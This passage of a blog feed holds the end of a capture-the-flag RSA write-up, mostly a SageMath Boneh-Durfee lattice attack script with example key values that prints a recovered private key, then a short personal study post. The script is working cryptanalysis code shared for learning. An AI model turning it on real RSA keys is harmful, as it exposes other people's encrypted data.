spellcheck="true"># nothing happened</span>    <span class="token keyword">return</span> BB<span class="token triple-quoted-string string">""" Returns:* 0,0   if it fails* -1,-1 if `strict=true`, and determinant doesn't bound* x0,y0 the solutions of `pol`"""</span><span class="token keyword">def</span> <span class="token function">boneh_durfee</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">,</span> YY<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Boneh and Durfee revisited by Herrmann and May    finds a solution if:    * d &lt; N^delta    * |x| &lt; e^delta    * |y| &lt; e^0.5    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292    """</span>    <span class="token comment" spellcheck="true"># substitution (Herrman and May)</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    Q <span class="token operator">=</span> PR<span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">*</span>y <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> u<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># u = xy + 1</span>    polZ <span class="token operator">=</span> Q<span class="token punctuation">(</span>pol<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>    UU <span class="token operator">=</span> XX<span class="token operator">*</span>YY <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment" spellcheck="true"># x-shifts</span>    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">-</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            xshift <span class="token operator">=</span> x<span class="token operator">^</span>ii <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xshift<span class="token punctuation">)</span>    gg<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># x-shifts list of monomials</span>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> polynomial <span class="token keyword">in</span> gg<span class="token punctuation">:</span>        <span class="token keyword">for</span> monomial <span class="token keyword">in</span> polynomial<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomial <span class="token operator">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>monomial<span class="token punctuation">)</span>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># y-shifts (selected by Herrman and May)</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            yshift <span class="token operator">=</span> y<span class="token operator">^</span>jj <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span>            yshift <span class="token operator">=</span> Q<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># substitution</span>    <span class="token comment" spellcheck="true"># y-shifts list of monomials</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u<span class="token operator">^</span>kk <span class="token operator">*</span> y<span class="token operator">^</span>jj<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># construct lattice B</span>    nn <span class="token operator">=</span> len<span class="token punctuation">(</span>monomials<span class="token punctuation">)</span>    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>        BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span> <span class="token keyword">in</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># Prototype to reduce the lattice</span>    <span class="token keyword">if</span> helpful_only<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># automatically remove</span>        BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">,</span> nn<span class="token number">-1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># reset dimension</span>        nn <span class="token operator">=</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> nn <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"failure"</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token comment" spellcheck="true"># check if vectors are helpful</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        helpful_vectors<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># check if determinant is correctly bounded</span>    det <span class="token operator">=</span> BB<span class="token punctuation">.</span>det<span class="token punctuation">(</span><span class="token punctuation">)</span>    bound <span class="token operator">=</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm<span class="token operator">*</span>nn<span class="token punctuation">)</span>    <span class="token keyword">if</span> det <span class="token operator">>=</span> bound<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"We do not have det &lt; bound. Solutions might not be found."</span>        <span class="token keyword">print</span> <span class="token string">"Try with highers m and t."</span>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>            diff <span class="token operator">=</span> <span class="token punctuation">(</span>log<span class="token punctuation">(</span>det<span class="token punctuation">)</span> <span class="token operator">-</span> log<span class="token punctuation">(</span>bound<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">"size det(L) - size e^(m*n) = "</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>diff<span class="token punctuation">)</span>        <span class="token keyword">if</span> strict<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>    <span class="token comment" spellcheck="true"># display the lattice basis</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># LLL</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"optimizing basis of the lattice via LLL, this can take a long time"</span>    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LLL is done!"</span>    <span class="token comment" spellcheck="true"># transform vector i &amp; j -> polynomials 1 &amp; 2</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"looking for independent vectors in the lattice"</span>    found_polynomials <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> pol1_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> pol2_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>pol1_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nn<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># for i and j, create the two polynomials</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>w<span class="token punctuation">,</span>z<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            pol1 <span class="token operator">=</span> pol2 <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>                pol1 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol1_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>                pol2 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol2_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># resultant</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>q<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            rr <span class="token operator">=</span> pol1<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol2<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># are these good polynomials?</span>            <span class="token keyword">if</span> rr<span class="token punctuation">.</span>is_zero<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">or</span> rr<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"found them, using vectors"</span><span class="token punctuation">,</span> pol1_idx<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> pol2_idx                found_polynomials <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> found_polynomials<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token operator">not</span> found_polynomials<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"no independant vectors could be found. This should very rarely happen..."</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    rr <span class="token operator">=</span> rr<span class="token punctuation">(</span>q<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># solutions</span>    soly <span class="token operator">=</span> rr<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>soly<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Your prediction (delta) is too small"</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    soly <span class="token operator">=</span> soly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    ss <span class="token operator">=</span> pol1<span class="token punctuation">(</span>q<span class="token punctuation">,</span> soly<span class="token punctuation">)</span>    solx <span class="token operator">=</span> ss<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">return</span> solx<span class="token punctuation">,</span> soly<span class="token keyword">def</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">############################################</span>    <span class="token comment" spellcheck="true"># How To Use This Script</span>    <span class="token comment" spellcheck="true">##########################################</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># The problem to solve (edit the following values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># the modulus</span>    N <span class="token operator">=</span> <span class="token number">0xc2fd2913bae61f845ac94e4ee1bb10d8531dda830d31bb221dac5f179a8f883f15046d7aa179aff848db2734b8f88cc73d09f35c445c74ee35b01a96eb7b0a6ad9cb9ccd6c02c3f8c55ecabb55501bb2c318a38cac2db69d510e152756054aaed064ac2a454e46d9b3b755b67b46906fbff8dd9aeca6755909333f5f81bf74db</span>    <span class="token comment" spellcheck="true"># the public exponent</span>    e <span class="token operator">=</span> <span class="token number">0x19441f679c9609f2484eb9b2658d7138252b847b2ed8ad182be7976ed57a3e441af14897ce041f3e07916445b88181c22f510150584eee4b0f776a5a487a4472a99f2ddc95efdd2b380ab4480533808b8c92e63ace57fb42bac8315fa487d03bec86d854314bc2ec4f99b192bb98710be151599d60f224114f6b33f47e357517</span>    <span class="token comment" spellcheck="true"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span>    delta <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token number">18</span> <span class="token comment" spellcheck="true"># this means that d &lt; N^delta</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Lattice (tweak those values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span>    m <span class="token operator">=</span> <span class="token number">4</span> <span class="token comment" spellcheck="true"># size of the lattice (bigger the better/slower)</span>    <span class="token comment" spellcheck="true"># you need to be a lattice master to tweak these</span>    t <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>delta<span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># optimization from Herrmann and May</span>    X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>floor<span class="token punctuation">(</span>N<span class="token operator">^</span>delta<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># this _might_ be too much</span>    Y <span class="token operator">=</span> floor<span class="token punctuation">(</span>N<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># correct if p, q are ~ same size</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Don't touch anything below</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Problem put in equation</span>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    A <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    pol <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token punctuation">(</span>A <span class="token operator">+</span> y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Find the solutions!</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Checking bounds</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== checking values ==="</span>        <span class="token keyword">print</span> <span class="token string">"* delta:"</span><span class="token punctuation">,</span> delta        <span class="token keyword">print</span> <span class="token string">"* delta &lt; 0.292"</span><span class="token punctuation">,</span> delta <span class="token operator">&lt;</span> <span class="token number">0.292</span>        <span class="token keyword">print</span> <span class="token string">"* size of e:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* size of N:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* m:"</span><span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token string">", t:"</span><span class="token punctuation">,</span> t    <span class="token comment" spellcheck="true"># boneh_durfee</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== running algorithm ==="</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    solx<span class="token punctuation">,</span> soly <span class="token operator">=</span> boneh_durfee<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> e<span class="token punctuation">,</span> m<span class="token punctuation">,</span> t<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># found a solution?</span>    <span class="token keyword">if</span> solx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== solution found ==="</span>        <span class="token keyword">if</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"x:"</span><span class="token punctuation">,</span> solx            <span class="token keyword">print</span> <span class="token string">"y:"</span><span class="token punctuation">,</span> soly        d <span class="token operator">=</span> int<span class="token punctuation">(</span>pol<span class="token punctuation">(</span>solx<span class="token punctuation">,</span> soly<span class="token punctuation">)</span> <span class="token operator">/</span> e<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"private key found:"</span><span class="token punctuation">,</span> d    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== no solution was found ==="</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== %s seconds ==="</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    example<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="üéàÂ∞èÁªì"><a href="#üéàÂ∞èÁªì" class="headerlink" title="üéàÂ∞èÁªì"></a>üéàÂ∞èÁªì</h2><blockquote><p>ËøôÈ¢òÂæàÂ•ΩÂú∞Â∏ÆËá™Â∑±ËÆ§ËØÜ‰∫Ü‰∏ÄÊ≥¢RSAÁöÑÂêÑÁßçÂßøÂäøÔºåÊ∑±ÂÖ•Âú∞Â≠¶‰π†‰∫Ü‰∏Ä‰∏ãRSA„ÄÇ</p></blockquote><h2 id="üìïÂèÇËÄÉ"><a href="#üìïÂèÇËÄÉ" class="headerlink" title="üìïÂèÇËÄÉ"></a>üìïÂèÇËÄÉ</h2><p><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a></p><p><a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p><a href="https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default" target="_blank" rel="noopener">https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/8654120.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8654120.html</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/7541481.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7541481.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‰∏ÄÈÅìRSAËøá‰∏ÄÈÅçÂêÑÁßçÊîªÂáª„ÄÇ&lt;/p&gt;
    
    </summary>
    
      <category term="ÂØÜÁ†ÅÂ≠¶" scheme="http://www.yof3ng.xyz/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="Âº∫ÁΩëÊùØ" scheme="http://www.yof3ng.xyz/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
      <category term="RSA" scheme="http://www.yof3ng.xyz/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>New_start</title>
    <link href="http://www.yof3ng.xyz/2019/05/23/New-start/"/>
    <id>http://www.yof3ng.xyz/2019/05/23/New-start/</id>
    <published>2019-05-23T15:10:08.000Z</published>
    <updated>2019-05-23T15:22:10.123Z</updated>
    
    <content type="html"><![CDATA[<p>‰ªäÂ§©ÂºÄÂßãÔºåÂõûÂà∞‰ª•ÂæÄÁöÑÂ≠¶‰π†Áä∂ÊÄÅÂêßÔºÅüôÇ</p><a id="more"></a><h1 id="2019Âπ¥5Êúà23Êó•‚òÄ"><a href="#2019Âπ¥5Êúà23Êó•‚òÄ" class="headerlink" title="2019Âπ¥5Êúà23Êó•‚òÄ"></a>2019Âπ¥5Êúà23Êó•‚òÄ</h1><blockquote><p>Ë∑ù‰ªäÂæà‰πÖÊ≤°Êõ¥Êñ∞ÂçöÂÆ¢‰∫ÜÔºå‰∏ÄÊñπÈù¢Âõ†‰∏∫ÊáíÔºå‰∏ÄÊñπÈù¢Âõ†‰∏∫Â≠¶‰π†ÁöÑÂÅúÊªûÔºåÂêÑÊñπÈù¢ÂéüÂõ†„ÄÇ</p><p>ËÄå‰ªäÊâìÁÆóÂõûÂà∞‰ª•ÂæÄÁöÑÂ≠¶‰π†Áä∂ÊÄÅÔºåÂõ†‰∏∫Âè™ÊúâËøôÊ†∑ÔºåÊâçÊòØÂÖÖÂÆûÁöÑÔºåÊúâËßÑÂàíÊúâÁõÆÊ†áÁöÑüòÑ„ÄÇ</p></blockquote><h2 id="ËøôÂá†‰∏™ÊúàÂÅö‰∫Ü‰ªÄ‰πà"><a href="#ËøôÂá†‰∏™ÊúàÂÅö‰∫Ü‰ªÄ‰πà" class="headerlink" title="ËøôÂá†‰∏™ÊúàÂÅö‰∫Ü‰ªÄ‰πà"></a>ËøôÂá†‰∏™ÊúàÂÅö‰∫Ü‰ªÄ‰πà</h2><blockquote><p>ËôΩÁÑ∂ËÆ§ËÆ§ÁúüÁúüÂú∞ÁúãËµ∞ËøáÊù•ÁöÑËøô‰∫õÊó•Â≠êÔºåÁ°ÆÂÆûÊ≤°ÂÅö‰ªÄ‰πàÂ§ß‰∫ãÔºåÂÅöÁöÑÈÉΩÊòØÂÆûÈôÖÊÑè‰πâ‰∏çÂ§ßÁöÑÂ∞è‰∫ãÊÉÖÔºåËá™Â∑±ÁöÑ‰∏ì‰∏öÁü•ËØÜÂíåÊäÄËÉΩ‰πüÂπ∂Ê≤°ÊúâÂ§öÂ§ßÁöÑËøõÊ≠•ÔºåÂèØ‰ª•ËØ¥ÊòØËôöÂ∫¶‰∫ÜËÆ∏Â§öÊó∂ÂÖâüôÉ„ÄÇ</p></blockquote><h2 id="Êó∂Èó¥‰∏çÂ§ö‰∫Ü"><a href="#Êó∂Èó¥‰∏çÂ§ö‰∫Ü" class="headerlink" title="Êó∂Èó¥‰∏çÂ§ö‰∫Ü"></a>Êó∂Èó¥‰∏çÂ§ö‰∫Ü</h2><blockquote><p>Êé•‰∏ãÊù•ÁöÑÊó∂Èó¥‰∏çÂ§ö‰∫ÜÔºåÁ¨¨Âõõ‰∏™Â≠¶Êúü‰πüÂà∞‰∫ÜÂ∞æÂ£∞Ôºå‰∏ÄËæπË¶ÅÂáÜÂ§áÂá†‰∏™ÊØîËµõÂíåÈ°πÁõÆÔºàÂ§ßÂ§öÊ≤°‰ªÄ‰πàÊÑè‰πâÔºå‰ΩÜ‰πüÂæóÂÆåÊàêÂÆÉ‰ª¨ÊâçË°åÔºâÔºå‰∏ÄËæπË¶ÅÊúüÊú´Â§ç‰π†Ôºå‰∏ÄËæπËøòÂæóÂºÄÂßãÊèêÂçáÂÅúÊªûËÆ∏‰πÖ‰∏çÂâçÁöÑÊäÄÊúØÂπøÂ∫¶ÂíåÊ∑±Â∫¶„ÄÇ</p><p>‰ªªÂä°Ëâ∞Â∑®ÔºåÂÖâÈò¥ÁèçË¥µÔºåÂ∏åÊúõËá™Â∑±Â§öÂÅöÁÇπÊúâÊÑè‰πâÁöÑ‰∫ãÊÉÖÂêßüí™ÔºåÂíåË∫´ËæπÁöÑ‰∫∫ÂÖ±ÂêåÂâçË°åÔºåÁõ∏‰∫íÊâ∂ÊåÅ‰øÉËøõÔºå‰ª•ÂêéË¶ÅÂ§öÂú®ÊäÄÊúØÊñπÈù¢ËßÅËßÅ‰∏ñÈù¢ÂëÄ„ÄÇ</p></blockquote>]]></content>
    
    <summary type="html">
    
